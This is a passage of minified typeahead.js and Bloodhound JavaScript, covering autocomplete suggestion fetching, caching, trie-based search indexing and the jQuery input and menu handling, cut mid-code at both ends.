!!(I.isNumber(e) && i() > e) } }), t; function i() { return (new Date).getTime() } function o(t) { return JSON.stringify(I.isUndefined(t) ? null : t) } function n(t) { return c.parseJSON(t) } }(), o = function () { "use strict"; var r = 0, g = {}, l = 6, e = new i(10); function t(t) { t = t || {}, this.cancelled = !1, this.lastReq = null, this._send = t.transport, this._get = t.limiter ? t.limiter(this._get) : this._get, this._cache = !1 === t.cache ? new i(0) : e } return t.setMaxPendingRequests = function (t) { l = t }, t.resetCache = function () { e.reset() }, I.mixin(t.prototype, { _fingerprint: function (t) { return (t = t || {}).url + t.type + c.param(t.data || {}) }, _get: function (t, e) { var n, i, o = this; function a(t) { e(null, t), o._cache.set(n, t) } function s() { e(!0) } n = this._fingerprint(t), this.cancelled || n !== this.lastReq || ((i = g[n]) ? i.done(a).fail(s) : r < l ? (r++, g[n] = this._send(t).done(a).fail(s).always(function () { r--, delete g[n], o.onDeckRequestArgs && (o._get.apply(o, o.onDeckRequestArgs), o.onDeckRequestArgs = null) })) : this.onDeckRequestArgs = [].slice.call(arguments, 0)) }, get: function (t, e) { var n, i; e = e || c.noop, t = I.isString(t) ? { url: t } : t || {}, i = this._fingerprint(t), this.cancelled = !1, this.lastReq = i, (n = this._cache.get(i)) ? e(null, n) : this._get(t, e) }, cancel: function () { this.cancelled = !0 } }), t }(), a = window.SearchIndex = function () { "use strict"; var r = "c", g = "i"; function t(t) { (t = t || {}).datumTokenizer && t.queryTokenizer || c.error("datumTokenizer and queryTokenizer are both required"), this.identify = t.identify || I.stringify, this.datumTokenizer = t.datumTokenizer, this.queryTokenizer = t.queryTokenizer, this.reset() } return I.mixin(t.prototype, { bootstrap: function (t) { this.datums = t.datums, this.trie = t.trie }, add: function (t) { var a = this; t = I.isArray(t) ? t : [t], I.each(t, function (t) { var o, e; a.datums[o = a.identify(t)] = t, e = n(a.datumTokenizer(t)), I.each(e, function (t) { for (var e, n = a.trie, i = t.split(""); e = i.shift();)(n = n[r][e] || (n[r][e] = s()))[g].push(o) }) }) }, get: function (t) { var e = this; return I.map(t, function (t) { return e.datums[t] }) }, search: function (t) { var a, s = this, e = n(this.queryTokenizer(t)); return I.each(e, function (t) { var e, n, i, o; if (a && 0 === a.length) return !1; for (e = s.trie, n = t.split(""); e && (i = n.shift());)e = e[r][i]; if (!e || 0 !== n.length) return !(a = []); o = e[g].slice(0), a = a ? function (t, e) { var n = 0, i = 0, o = []; t = t.sort(), e = e.sort(); var a = t.length, s = e.length; for (; n < a && i < s;)t[n] < e[i] ? n++ : (t[n] > e[i] || (o.push(t[n]), n++), i++); return o }(a, o) : o }), a ? I.map(function (t) { for (var e = {}, n = [], i = 0, o = t.length; i < o; i++)e[t[i]] || (e[t[i]] = !0, n.push(t[i])); return n }(a), function (t) { return s.datums[t] }) : [] }, all: function () { var t = []; for (var e in this.datums) t.push(this.datums[e]); return t }, reset: function () { this.datums = {}, this.trie = s() }, serialize: function () { return { datums: this.datums, trie: this.trie } } }), t; function n(t) { return t = I.filter(t, function (t) { return !!t }), t = I.map(t, function (t) { return t.toLowerCase() }) } function s() { var t = {}; return t[g] = [], t[r] = {}, t } }(), s = function () { "use strict"; var n; function t(t) { this.url = t.url, this.ttl = t.ttl, this.cache = t.cache, this.prepare = t.prepare, this.transform = t.transform, this.transport = t.transport, this.thumbprint = t.thumbprint, this.storage = new e(t.cacheKey) } return n = { data: "data", protocol: "protocol", thumbprint: "thumbprint" }, I.mixin(t.prototype, { _settings: function () { return { url: this.url, type: "GET", dataType: "json" } }, store: function (t) { this.cache && (this.storage.set(n.data, t, this.ttl), this.storage.set(n.protocol, location.protocol, this.ttl), this.storage.set(n.thumbprint, this.thumbprint, this.ttl)) }, fromCache: function () { var t, e = {}; return this.cache ? (e.data = this.storage.get(n.data), e.protocol = this.storage.get(n.protocol), e.thumbprint = this.storage.get(n.thumbprint), t = e.thumbprint !== this.thumbprint || e.protocol !== location.protocol, e.data && !t ? e.data : null) : null }, fromNetwork: function (e) { var t, n = this; e && (t = this.prepare(this._settings()), this.transport(t).fail(function () { e(!0) }).done(function (t) { e(null, n.transform(t)) })) }, clear: function () { return this.storage.clear(), this } }), t }(), r = function () { "use strict"; function t(t) { this.url = t.url, this.prepare = t.prepare, this.transform = t.transform, this.transport = new o({ cache: t.cache, limiter: t.limiter, transport: t.transport }) } return I.mixin(t.prototype, { _settings: function () { return { url: this.url, type: "GET", dataType: "json" } }, get: function (t, n) { var e, i = this; if (n) return t = t || "", e = this.prepare(t, this._settings()), this.transport.get(e, function (t, e) { n(t ? [] : i.transform(e)) }) }, cancelLastRequest: function () { this.transport.cancel() } }), t }(), g = function () { "use strict"; return function (t) { var e, n, i, o, a, s = { initialize: !0, identify: I.stringify, datumTokenizer: null, queryTokenizer: null, sufficient: 5, sorter: null, local: [], prefetch: null, remote: null }; return (t = I.mixin(s, t || {})).datumTokenizer || c.error("datumTokenizer is required"), t.queryTokenizer || c.error("queryTokenizer is required"), e = t.sorter, t.sorter = e ? function (t) { return t.sort(e) } : I.identity, t.local = I.isFunction(t.local) ? t.local() : t.local, t.prefetch = (n = t.prefetch) ? (i = { url: null, ttl: 864e5, cache: !0, cacheKey: null, thumbprint: "", prepare: I.identity, transform: I.identity, transport: null }, n = I.isString(n) ? { url: n } : n, (n = I.mixin(i, n)).url || c.error("prefetch requires url to be set"), n.transform = n.filter || n.transform, n.cacheKey = n.cacheKey || n.url, n.thumbprint = "0.11.1" + n.thumbprint, n.transport = n.transport ? r(n.transport) : c.ajax, n) : null, t.remote = (o = t.remote) ? (a = { url: null, cache: !0, prepare: null, replace: null, wildcard: null, limiter: null, rateLimitBy: "debounce", rateLimitWait: 300, transform: I.identity, transport: null }, o = I.isString(o) ? { url: o } : o, (o = I.mixin(a, o)).url || c.error("remote requires url to be set"), o.transform = o.filter || o.transform, o.prepare = function (t) { var e, n, i; return e = t.prepare, n = t.replace, i = t.wildcard, e || (e = n ? function (t, e) { return e.url = n(e.url, t), e } : t.wildcard ? function (t, e) { return e.url = e.url.replace(i, encodeURIComponent(t)), e } : function (t, e) { return e }) }(o), o.limiter = function (t) { var e, n, i; return e = t.limiter, n = t.rateLimitBy, i = t.rateLimitWait, e = e || (/^throttle$/i.test(n) ? function (e) { return function (t) { return I.throttle(t, e) } } : function (e) { return function (t) { return I.debounce(t, e) } })(i) }(o), o.transport = o.transport ? r(o.transport) : c.ajax, delete o.replace, delete o.wildcard, delete o.rateLimitBy, delete o.rateLimitWait, o) : void 0, t }; function r(n) { return function (t) { var e = c.Deferred(); return n(t, function (t) { I.defer(function () { e.resolve(t) }) }, function (t) { I.defer(function () { e.reject(t) }) }), e } } }(); return function () { "use strict"; var t; function e(t) { t = g(t), this.sorter = t.sorter, this.identify = t.identify, this.sufficient = t.sufficient, this.local = t.local, this.remote = t.remote ? new r(t.remote) : null, this.prefetch = t.prefetch ? new s(t.prefetch) : null, this.index = new a({ identify: this.identify, datumTokenizer: t.datumTokenizer, queryTokenizer: t.queryTokenizer }), !1 !== t.initialize && this.initialize() } return t = window && window.Bloodhound, e.noConflict = function () { return window && (window.Bloodhound = t), e }, e.tokenizers = n, I.mixin(e.prototype, { __ttAdapter: function () { var i = this; return this.remote ? function (t, e, n) { return i.search(t, e, n) } : function (t, e) { return i.search(t, e) } }, _loadPrefetch: function () { var t, n = this, i = c.Deferred(); return this.prefetch ? (t = this.prefetch.fromCache()) ? (this.index.bootstrap(t), i.resolve()) : this.prefetch.fromNetwork(function (t, e) { if (t) return i.reject(); n.add(e), n.prefetch.store(n.index.serialize()), i.resolve() }) : i.resolve(), i.promise() }, _initialize: function () { var t = this; return this.clear(), (this.initPromise = this._loadPrefetch()).done(function () { t.add(t.local) }), this.initPromise }, initialize: function (t) { return !this.initPromise || t ? this._initialize() : this.initPromise }, add: function (t) { return this.index.add(t), this }, get: function (t) { return t = I.isArray(t) ? t : [].slice.call(arguments), this.index.get(t) }, search: function (t, e, i) { var o = this, a = this.sorter(this.index.search(t)); return e(this.remote ? a.slice() : a), this.remote && a.length < this.sufficient ? this.remote.get(t, function (t) { var n = []; I.each(t, function (e) { I.some(a, function (t) { return o.identify(e) === o.identify(t) }) || n.push(e) }), i && i(n) }) : this.remote && this.remote.cancelLastRequest(), this }, all: function () { return this.index.all() }, clear: function () { return this.index.reset(), this }, clearPrefetchCache: function () { return this.prefetch && this.prefetch.clear(), this }, clearRemoteCache: function () { return o.resetCache(), this }, ttAdapter: function () { return this.__ttAdapter() } }), e }() }), function (t) { "function" == typeof define && define.amd ? define("typeahead.js", ["jquery"], t) : "object" == typeof exports ? module.exports = t(require("jquery")) : t(jQuery) }(function (A) { var p = function () { "use strict"; return { isMsie: function () { return !!/(msie|trident)/i.test(navigator.userAgent) && navigator.userAgent.match(/(msie |rv:)(\d+(.\d+)?)/i)[2] }, isBlankString: function (t) { return !t || /^\s*$/.test(t) }, escapeRegExChars: function (t) { return t.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&") }, isString: function (t) { return "string" == typeof t }, isNumber: function (t) { return "number" == typeof t }, isArray: A.isArray, isFunction: A.isFunction, isObject: A.isPlainObject, isUndefined: function (t) { return void 0 === t }, isElement: function (t) { return !(!t || 1 !== t.nodeType) }, isJQuery: function (t) { return t instanceof A }, toStr: function (t) { return p.isUndefined(t) || null === t ? "" : t + "" }, bind: A.proxy, each: function (t, n) { A.each(t, function (t, e) { return n(e, t) }) }, map: A.map, filter: A.grep, every: function (n, i) { var o = !0; return n ? (A.each(n, function (t, e) { if (!(o = i.call(null, e, t, n))) return !1 }), !!o) : o }, some: function (n, i) { var o = !1; return n ? (A.each(n, function (t, e) { if (o = i.call(null, e, t, n)) return !1 }), !!o) : o }, mixin: A.extend, identity: function (t) { return t }, clone: function (t) { return A.extend(!0, {}, t) }, getIdGenerator: function () { var t = 0; return function () { return t++ } }, templatify: function (t) { return A.isFunction(t) ? t : function () { return String(t) } }, defer: function (t) { setTimeout(t, 0) }, debounce: function (o, a, s) { var r, g; return function () { var t = this, e = arguments, n = function () { r = null, s || (g = o.apply(t, e)) }, i = s && !r; return clearTimeout(r), r = setTimeout(n, a), i && (g = o.apply(t, e)), g } }, throttle: function (n, i) { var o, a, s, r, g = 0, l = function () { g = new Date, s = null, r = n.apply(o, a) }; return function () { var t = new Date, e = i - (t - g); return o = this, a = arguments, e <= 0 ? (clearTimeout(s), s = null, g = t, r = n.apply(o, a)) : s = s || setTimeout(l, e), r } }, stringify: function (t) { return p.isString(t) ? t : JSON.stringify(t) }, noop: function () { } } }(), n = function () { "use strict"; var i = { wrapper: "twitter-typeahead", input: "tt-input", hint: "tt-hint", menu: "tt-menu", dataset: "tt-dataset", suggestion: "tt-suggestion", selectable: "tt-selectable", empty: "tt-empty", open: "tt-open", cursor: "tt-cursor", highlight: "tt-highlight" }; return function (t) { var e, n; return n = p.mixin({}, i, t), { css: (e = { css: function () { var t = { wrapper: { position: "relative", display: "inline-block" }, hint: { position: "absolute", top: "0", left: "0", borderColor: "transparent", boxShadow: "none", opacity: "1" }, input: { position: "relative", verticalAlign: "top", backgroundColor: "transparent" }, inputWithNoHint: { position: "relative", verticalAlign: "top" }, menu: { position: "absolute", top: "100%", left: "0", zIndex: "100", display: "none" }, ltr: { left: "0", right: "auto" }, rtl: { left: "auto", right: " 0" } }; p.isMsie() && p.mixin(t.input, { backgroundImage: "url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)" }); return t }(), classes: n, html: function (t) { return { wrapper: '<span class="' + t.wrapper + '"></span>', menu: '<div class="' + t.menu + '"></div>' } }(n), selectors: function (t) { var n = {}; return p.each(t, function (t, e) { n[e] = "." + t }), n }(n) }).css, html: e.html, classes: e.classes, selectors: e.selectors, mixin: function (t) { p.mixin(t, e) } } } }(), m = function () { "use strict"; var n; function t(t) { t && t.el || A.error("EventBus initialized without el"), this.$el = A(t.el) } return n = { render: "rendered", cursorchange: "cursorchanged", select: "selected", autocomplete: "autocompleted" }, p.mixin(t.prototype, { _trigger: function (t, e) { var n = A.Event("typeahead:" + t); return (e = e || []).unshift(n), this.$el.trigger.apply(this.$el, e), n }, before: function (t) { var e = [].slice.call(arguments, 1); return this._trigger("before" + t, e).isDefaultPrevented() }, trigger: function (t) { var e; this._trigger(t, [].slice.call(arguments, 1)), (e = n[t]) && this._trigger(e, [].slice.call(arguments, 1)) } }), t }(), e = function () { "use strict"; var r = /\s+/, s = function () { var t; t = window.setImmediate ? function (t) { setImmediate(function () { t() }) } : function (t) { setTimeout(function () { t() }, 0) }; return t }(); return { onSync: function (t, e, n) { return i.call(this, "sync", t, e, n) }, onAsync: function (t, e, n) { return i.call(this, "async", t, e, n) }, off: function (t) { var e; if (!this._callbacks) return this; t = t.split(r); for (; e = t.shift();)delete this._callbacks[e]; return this }, trigger: function (t) { var e, n, i, o, a; if (!this._callbacks) return this; t = t.split(r), i = [].slice.call(arguments, 1); for (; (e = t.shift()) && (n = this._callbacks[e]);)o = g(n.sync, this, [e].concat(i)), a = g(n.async, this, [e].concat(i)), o() && s(a); return this } }; function i(t, e, n, i) { var o, a, s; if (!n) return this; for (e = e.split(r), n = i ? (s = i, (a = n).bind ? a.bind(s) : function () { a.apply(s, [].slice.call(arguments, 0)) }) : n, this._callbacks = this._callbacks || {}; o = e.shift();)this._callbacks[o] = this._callbacks[o] || { sync: [], async: [] }, this._callbacks[o][t].push(n); return this } function g(i, o, a) { return function () { for (var t, e = 0, n = i.length; !t && e < n; e += 1)t = !1 === i[e].apply(o, a); return !t } } }(), g = function (s) { "use strict"; var t = { node: null, pattern: null, tagName: "strong", className: null, wordsOnly: !1, caseSensitive: !1 }; return function (o) { var a; (o = p.mixin({}, t, o)).node && o.pattern && (o.pattern = p.isArray(o.pattern) ? o.pattern : [o.pattern], a = function (t, e, n) { for (var i, o = [], a = 0, s = t.length; a < s; a++)o.push(p.escapeRegExChars(t[a])); return i = n ? "\\b(" + o.join("|") + ")\\b" : "(" + o.join("|") + ")", e ? new RegExp(i) : new RegExp(i, "i") }(o.pattern, o.caseSensitive, o.wordsOnly), function t(e, n) { var i; for (var o = 0; o < e.childNodes.length; o++)3 === (i = e.childNodes[o]).nodeType ? o += n(i) ? 1 : 0 : t(i, n) }(o.node, function (t) { var e, n, i; (e = a.exec(t.data)) && (i = s.createElement(o.tagName), o.className && (i.className = o.className), (n = t.splitText(e.index)).splitText(e[0].length), i.appendChild(n.cloneNode(!0)), t.parentNode.replaceChild(i, n)); return !!e })) } }(window.document), f = function () { "use strict"; var a; function s(t, e) { var n; (t = t || {}).input || A.error("input is missing"), e.mixin(this), this.$hint = A(t.hint), this.$input = A(t.input), this.query = this.$input.val(), this.queryWhenFocused = this.hasFocus() ? this.query : null, this.$overflowHelper = (n = this.$input, A('<pre aria-hidden="true"></pre>').css({ position: "absolute", visibility: "hidden", whiteSpace: "pre", fontFamily: n.css("font-family"), fontSize: n.css("font-size"), fontStyle: n.css("font-style"), fontVariant: n.css("font-variant"), fontWeight: n.css("font-weight"), wordSpacing: n.css("word-spacing"), letterSpacing: n.css("letter-spacing"), textIndent: n.css("text-indent"), textRendering: n.css("text-rendering"), textTransform: n.css("text-transform") }).insertAfter(n)), this._checkLanguageDirection(), 0 === this.$hint.length && (this.setHint = this.getHint = this.clearHint = this.clearHintIfInvalid = p.noop) } return a = { 9: "tab", 27: "esc", 37: "left", 39: "right", 13: "enter", 38: "up", 40: "down" }, s.normalizeQuery = function (t) { return p.toStr(t).replace(/^\s*/g, "").replace(/\s{2,}/g, " ") }, p.mixin(s.prototype, e, { _onBlur: function () { this.resetInputValue(), this.trigger("blurred") }, _onFocus: function () { this.queryWhenFocused = this.query, this.trigger("focused") }, _onKeydown: function (t) { var e = a[t.which || t.keyCode]; this._managePreventDefault(e, t), e && this._shouldTrigger(e, t) && this.trigger(e + "Keyed", t) }, _onInput: function () { this._setQuery(this.getInputValue()), this.clearHintIfInvalid(), this._checkLanguageDirection() }, _managePreventDefault: function (t, e) { var n; switch (t) { case "up": case "down": n = !i(e); break; default: n = !1 }n && e.preventDefault() }, _shouldTrigger: function (t, e) { var n; switch (t) { case "tab": n = !i(e); break; default: n = !0 }return n }, _checkLanguageDirection: function () { var t = (this.$input.css("direction") || "ltr").toLowerCase(); this.dir !== t && (this.dir = t, this.$hint.attr("dir", t), this.trigger("langDirChanged", t)) }, _setQuery: function (t, e) { var n, i, o, a; o = t, a = this.query, i = (n = s.normalizeQuery(o) === s.normalizeQuery(a)) && this.query.length !== t.length, this.query = t, e || n ? !e && i && this.trigger("whitespaceChanged", this.query) : this.trigger("queryChanged", this.query) }, bind: function () { var e = this, t = p.bind(this._onBlur, this), n = p.bind(this._onFocus, this), i = p.bind(this._onKeydown, this), o = p.bind(this._onInput, this); return this.$input.on("blur.tt", t).on("focus.tt", n).on("keydown.tt", i), !p.isMsie() || 9 < p.isMsie() ? this.$input.on("input.tt", o) : this.$input.on("keydown.tt keypress.tt cut.tt paste.tt", function (t) { a[t.which || t.keyCode] || p.defer(p.bind(e._onInput, e, t)) }), this }, focus: function () { this.$input.focus() }, blur: function () { this.$input.blur() }, getLangDir: function () { return this.dir }, getQuery: function () { return this.query || "" }, setQuery: function (t, e) { this.setInputValue(t), this._setQuery(t, e) }, hasQueryChangedSinceLastFocus: function () { return this.query !== this.queryWhenFocused }, getInputValue: function () { return this.$input.val() }, setInputValue: function (t) { this.$input.val(t), this.clearHintIfInvalid(), this._checkLanguageDirection() }, resetInputValue: function () { this.setInputValue(this.query) }, getHint: function () { return this.$hint.val() }, setHint: function (t) { this.$hint.val(t) }, clearHint: function () { this.setHint("") }, clearHintIfInvalid: function () { var t = this.getInputValue(), e = this.getHint(), n = t !== e && 0 === e.indexOf(t); "" !== t && n && !this.hasOverflow() || this.clearHint() }, hasFocus: function () { return this.$input.is(":focus") }, hasOverflow: function () { var t = this.$input.width() - 2; return this.$overflowHelper.text(this.getInputValue()), this.$overflowHelper.width() >= t }, isCursorAtEnd: function () { var t, e = this.$input.val().length, n = this.$input[0].selectionStart; return p.isNumber(n) ? n === e : !document.selection || ((t = document.selection.createRange()).moveStart("character", -e), e === t.text.length) }, destroy: function () { this.$hint.off(".tt"), this.$input.off(".tt"), this.$overflowHelper.remove(), this.$hint = this.$input = this.$overflowHelper = A("<div>") } }), s; function i(t) { return t.altKey || t.ctrlKey || t.metaKey || t.shiftKey } }(), o = function () { "use strict"; var s, r; function t(t, e) { var n, i, o, a; (t = t || {}).templates = t.templates || {}, t.templates.notFound = t.templates.notFound || t.templates.empty, t.source || A.error("missing source"), t.node || A.error("missing node"), t.name && (n = t.name, !/^[_a-zA-Z0-9-]+$/.test(n)) && A.error("invalid dataset name: " + t.name), e.mixin(this), this.highlight = !!t.highlight, this.name = t.name || r(), this.limit = t.limit || 5, this.displayFn = (i = (i = t.display || t.displayKey) || p.stringify, p.isFunction(i) ? i : function (t) { return t[i] }), this.templates = (o = t.templates, a = this.displayFn, { notFound: o.notFound && p.templatify(o.notFound), pending: o.pending && p.templatify(o.pending), header: o.header && p.templatify(o.header), footer: o.footer && p.templatify(o.footer), suggestion: o.suggestion || function (t) { return A("<div>").text(a(t)) } }), this.source = t.source.__ttAdapter ? t.source.__ttAdapter() : t.source, this.async = p.isUndefined(t.async) ? 2 < this.source.length : !!t.async, this._resetLastSuggestion(), this.$el = A(t.node).addClass(this.classes.dataset).addClass(this.classes.dataset + "-" + this.name) } return s = { val: "tt-selectable-display", obj: "tt-selectable-object" }, r = p.getIdGenerator(), t.extractData = function (t) { var e = A(t); return e.data(s.obj) ? { val: e.data(s.val) || "", obj: e.data(s.obj) || null } : null }, p.mixin(t.prototype, e, { _overwrite: function (t, e) { (e = e || []).length ? this._renderSuggestions(t, e) : this.async && this.templates.pending ? this._renderPending(t) : !this.async && this.templates.notFound ? this._renderNotFound(t) : this._empty(), this.trigger("rendered", this.name, e, !1) }, _append: function (t, e) { (e = e || []).length && this.$lastSuggestion.length ? this._appendSuggestions(t, e) : e.length ? this._renderSuggestions(t, e) : !this.$lastSuggestion.length && this.templates.notFound && this._renderNotFound(t), this.trigger("rendered", this.name, e, !0) }, _renderSuggestions: function (t, e) { var n = this._getSuggestionsFragment(t, e); this.$lastSuggestion = n.children().last(), this.$el.html(n).prepend(this._getHeader(t, e)).append(this._getFooter(t, e)) }, _appendSuggestions: function (t, e) { var n = this._getSuggestionsFragment(t, e), i = n.children().last(); this.$lastSuggestion.after(n), this.$lastSuggestion = i }, _renderPending: function (t) { var e = this.templates.pending; this._resetLastSuggestion(), e && this.$el.html(e({ query: t, dataset: this.name })) }, _renderNotFound: function (t) { var e = this.templates.notFound; this._resetLastSuggestion(), e && this.$el.html(e({ query: t, dataset: this.name })) }, _empty: function () { this.$el.empty(), this._resetLastSuggestion() }, _getSuggestionsFragment: function (i, t) { var o = this, a = document.createDocumentFragment(); return p.each(t, function (t) { var e = o._injectQuery(i, t), n = A(o.templates.suggestion(e)).data(s.obj, t).data(s.val, o.displayFn(t)).addClass(o.classes.suggestion + " " + o.classes.selectable); a.appendChild(n[0]) }), this.highlight && g({ className: this.classes.highlight, node: a, pattern: i }), A(a) }, _getFooter: function (t, e) { return this.templates.footer ? this.templates.footer({ query: t, suggestions: e, dataset: this.name }) : null }, _getHeader: function (t, e) { return this.templates.header ? this.templates.header({ query: t, suggestions: e, dataset: this.name }) : null }, _resetLastSuggestion: function () { this.$lastSuggestion = A() }, _injectQuery: function (t, e) { return p.isObject(e) ? p.mixin({ _query: t }, e) : e }, update: function (e) { var n = this, i = !1, o = !1, a = 0; function t(t) { o || (o = !0, t = (t || []).slice(0, n.limit), a = t.length, n._overwrite(e, t), a < n.limit && n.async && n.trigger("asyncRequested", e)) } this.cancel(), this.cancel = function () { i = !0, n.cancel = A.noop, n.async && n.trigger("asyncCanceled", e) }, this.source(e, t, function (t) { t = t || [], !i && a < n.limit && (n.cancel = A.noop, a += t.length, n._append(e, t.slice(0, n.limit - a)), n.async && n.trigger("asyncReceived", e)) }), o || t([]) }, cancel: A.noop, clear: function () { this._empty(), this.cancel(), this.trigger("cleared") }, isEmpty: function () { return this.$el.is(":empty") }, destroy: function () { this.$el = A("<div>") } }), t }(), b = function () { "use strict"; function t(t, n) { var i = this; (t = t || {}).node || A.error("node is required"), n.mixin(this), this.$node = A(t.node), this.query = null, this.datasets = p.map(t.datasets, function (t) { var e = i.$node.find(t.node).first(); return t.node = e.length ? e : A("<div>").appendTo(i.$node), new o(t, n) }) } return p.mixin(t.prototype, e, { _onSelectableClick: function (t) { this.trigger("selectableClicked", A(t.currentTarget)) }, _onRendered: function (t, e, n, i) { this.$node.toggleClass(this.classes.empty, this._allDatasetsEmpty()), this.trigger("datasetRendered", e, n, i) }, _onCleared: function () { this.$node.toggleClass(this.classes.empty, this._allDatasetsEmpty()), this.trigger("datasetCleared") }, _propagate: function () { this.trigger.apply(this, arguments) }, _allDatasetsEmpty: function () { return p.every(this.datasets, function (t) { return t.isEmpty() }) }, _getSelectables: function () { return this.$node.find(this.selectors.selectable) }, _removeCursor: function () { var t = this.getActiveSelectable(); t && t.removeClass(this.classes.cursor) }, _ensureVisible: function (t) { var e = t.position().top, n = e + t.outerHeight(!0), i = this.$node.scrollTop(), o = this.$node.height() + parseInt(this.$node.css("paddingTop"), 10) + parseInt(this.$node.css("paddingBottom"), 10); e < 0 ? this.$node.scrollTop(i + e) : o < n && this.$node.scrollTop(i + (n - o)) }, bind: function () { var e = this, t = p.bind(this._onSelectableClick, this); return this.$node.on("click.tt", this.selectors.selectable, t), p.each(this.datasets, function (t) { t.onSync("asyncRequested", e._propagate, e).onSync("asyncCanceled", e._propagate, e).onSync("asyncReceived", e._propagate, e).onSync("rendered", e._onRendered, e).onSync("cleared", e._onCleared, e) }), this }, isOpen: function () { return this.$node.hasClass(this.classes.open) }, open: function () { this.$node.addClass(this.classes.open) }, close: function () { this.$node.removeClass(this.classes.open), this._removeCursor() }, setLanguageDirection: function (t) { this.$node.attr("dir", t) }, selectableRelativeToCursor: function (t) { var e = this.getActiveSelectable(), n = this._getSelectables(), i = (e ? n.index(e) : -1) + t; return -1 === (i = (i = (i + 1) % (n.length + 1) - 1) < -1 ? n.length - 1 : i) ? null : n.eq(i) }, setCursor: function (t) { this._removeCursor(), (t = t && t.first()) && (t.addClass(this.classes.cursor), this._ensureVisible(t)) }, getSelectableData: function (t) { return t && t.length ? o.extractData(t) : null }, getActiveSelectable: function () { var t = this._getSelectables().filter(this.selectors.cursor).first(); return t.length ? t : null }, getTopSelectable: function () { var t = this._getSelectables().first(); return t.length ? t : null }, update: function (e) { var t = e !== this.query; return t && (this.query = e, p.each(this.datasets, function (t) { t.update(e) })), t }, empty: function () { p.each(this.datasets, function (t) { t.clear() }), this.query = null, this.$node.addClass(this.classes.empty) }, destroy: function () { this.$node.off(".tt"), this.$node = A("<div>"), p.each(this.datasets, function (t) { t.destroy() }) } }), t }(), B = function () { "use strict"; var e = b.prototype; function t() { b.apply(this, [].slice.call(arguments, 0)) } return p.mixin(t.prototype, b.prototype, { open: function () { return this._allDatasetsEmpty() || this._show(), e.open.apply(this, [].slice.call(arguments, 0)) }, close: function () { return this._hide(), e.close.apply(this, [].slice.call(arguments, 0)) }, _onRendered: function () { return this._allDatasetsEmpty() ? this._hide() : this.isOpen() && this._show(), e._onRendered.apply(this, [].slice.call(arguments, 0)) }, _onCleared: function () { return this._allDatasetsEmpty() ? this._hide() : this.isOpen() && this._show(), e._onCleared.apply(this, [].slice.call(arguments, 0)) }, setLanguageDirection: function (t) { return this.$node.css("ltr" === t ? this.css.ltr : this.css.rtl), e.setLanguageDirection.apply(this, [].slice.call(arguments, 0)) }, _hide: function () { this.$node.hide() }, _show: function () { this.$node.css("display", "block") } }), t }(), y = function () { "use strict"; function t(t, e) { var n, i, o, a, s, r, g, l, c, I, u; (t = t || {}).input || A.error("missing input"), t.menu || A.error("missing menu"), t.eventBus || A.error("missing event bus"), e.mixin(this), this.eventBus = t.eventBus, this.minLength = p.isNumber(t.minLength) ? t.minLength : 1, this.input = t.input, this.menu = t.menu, this.enabled = !0, this.active = !1, this.input.hasFocus() && this.activate(), this.dir = this.input.getLangDir(), this._hacks(), this.menu.bind().onSync("selectableClicked", this._onSelectableClicked, this).onSync("asyncRequested", this._onAsyncRequested, this).onSync("asyncCanceled", this._onAsyncCanceled, this).onSync("asyncReceived", this._onAsyncReceived, this).onSync("datasetRendered", this._onDatasetRendered, this).onSync("datasetCleared", this._onDatasetCleared, this), n = h(this, "activate", "open", "_onFocused"), i = h(this, "deactivate", "_onBlurred"), o = h(this, "isActive", "isOpen", "_onEnterKeyed"), a = h(this, "isActive", "isOpen", "_onTabKeyed"), s = h(this, "isActive", "_onEscKeyed"), r = h(this, "isActive", "open", "_onUpKeyed"), g = h(this, "isActive", "open", "_onDownKeyed"), l = h(this, "isActive", "isOpen", "_onLeftKeyed"), c = h(this, "isActive", "isOpen", "_onRightKeyed"), I = h(this, "_openIfActive", "_onQueryChanged"), u = h(this, "_openIfActive", "_onWhitespaceChanged"), this.input.bind().onSync("focused", n, this).onSync("blurred", i, this).onSync("enterKeyed", o, this).onSync("tabKeyed", a, this).onSync("escKeyed", s, this).onSync("upKeyed", r, this).onSync("downKeyed", g, this).onSync("leftKeyed", l, this).onSync("rightKeyed", c, this).onSync("queryChanged", I, this).onSync("whitespaceChanged", u, this).onSync("langDirChanged", this._onLangDirChanged, this) } return p.mixin(t.prototype, { _hacks: function () { var o = this.input.$input || A("<div>"), a = this.menu.$node || A("<div>"); o.on("blur.tt", function (t) { var e = document.activeElement, n = a.is(e), i = 0 < a.has(e).length; p.isMsie() && (n || i) && (t.preventDefault(), t.stopImmediatePropagation(), p.defer(function () { o.focus() })) }), a.on("mousedown.tt", function (t) { t.preventDefault() }) }, _onSelectableClicked: function (t, e) { this.select(e) }, _onDatasetCleared: function () { this._updateHint() }, _onDatasetRendered: function (t, e, n, i) { this._updateHint(), this.eventBus.trigger("render", n, i, e) }, _onAsyncRequested: function (t, e, n) { this.eventBus.trigger("asyncrequest", n, e) }, _onAsyncCanceled: function (t, e, n) { this.eventBus.trigger("asynccancel", n, e) }, _onAsyncReceived: function (t, e, n) { this.eventBus.trigger("asyncreceive", n, e) }, _onFocused: function () { this._minLengthMet() && this.menu.update(this.input.getQuery()) }, _onBlurred: function () { this.input.hasQueryChangedSinceLastFocus() && this.eventBus.trigger("change", this.input.getQuery()) }, _onEnterKeyed: function (t, e) { var n; (n = this.menu.getActiveSelectable()) && this.select(n) && e.preventDefault() }, _onTabKeyed: function (t, e) { var n; (n = this.menu.getActiveSelectable()) ? this.select(n) && e.preventDefault() : (n = this.menu.getTopSelectable()) && this.autocomplete(n) && e.preventDefault() }, _onEscKeyed: function () { this.close() }, _onUpKeyed: function () { this.moveCursor(-1) }, _onDownKeyed: function () { this.moveCursor(1) }, _onLeftKeyed: function () { "rtl" === this.dir && this.input.isCursorAtEnd() && this.autocomplete(this.menu.getTopSelectable()) }, _onRightKeyed: function () { "ltr" === this.dir && this.input.isCursorAtEnd() && this.autocomplete(this.menu.getTopSelectable()) }, _onQueryChanged: function (t, e) { this._minLengthMet(e) ? this.menu.update(e) : this.menu.empty() }, _onWhitespaceChanged: function () { this._updateHint() }, _onLangDirChanged: function (t, e) { this.dir !== e && (this.dir = e, this.menu.setLanguageDirection(e)) }, _openIfActive: function () { this.isActive() && this.open() }, _minLengthMet: function (t) { return (t = p.isString(t) ? t : this.input.getQuery() || "").length >= this.minLength }, _updateHint: function () { var t, e, n, i = this.menu.getTopSelectable(), o = this.menu.getSelectableData(i), a = this.input.getInputValue(); !o || p.isBlankString(a) || this.input.hasOverflow() 